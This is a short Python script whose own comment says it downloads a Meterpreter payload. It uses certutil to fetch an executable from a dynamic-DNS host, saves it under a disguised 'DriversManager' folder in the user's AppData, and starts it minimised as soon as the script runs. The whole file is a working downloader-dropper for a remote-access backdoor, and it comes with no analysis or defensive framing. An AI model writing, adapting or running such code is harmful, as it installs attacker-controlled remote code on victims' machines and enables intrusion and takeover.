#/usr/bin/python
#coding:utf-8
import os

""" THIS FILE IS PART OF THE FINAL EXECUTABLES """

# ENVIRONMENT VARIABLE TO USE
letter_drive = os.environ["SystemDrive"]
current_user = os.environ["USERNAME"]

# FUNCTION TO DOWNLOAD METERPRETER PAYLOAD
def dwnExec():
    dwn = 'certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive, current_user)
    os.system(dwn)
    exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive, current_user)
    os.system(exc)

# CALL FUNCTION
dwnExec()
